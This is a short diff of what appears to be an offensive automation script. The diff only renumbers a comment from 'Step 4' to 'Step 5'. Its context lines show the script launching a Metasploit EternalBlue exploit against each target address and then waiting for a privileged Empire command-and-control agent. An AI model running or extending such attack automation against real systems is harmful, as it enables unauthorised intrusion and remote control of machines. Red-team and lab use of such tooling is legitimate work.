@@ -48,6 +48,6 @@ for target_address in targets:
         msf_eternal_blue.run(client, target_address, cmd)
         print('Launched EB against ' + target_address)
 
-# Step 4 - Wait for high_integrity empire agent; 
+# Step 5 - Wait for high_integrity empire agent; 
 empire_agent = empire_wait_for_agent.run(API, need_privilege=True)
 print(empire_agent)
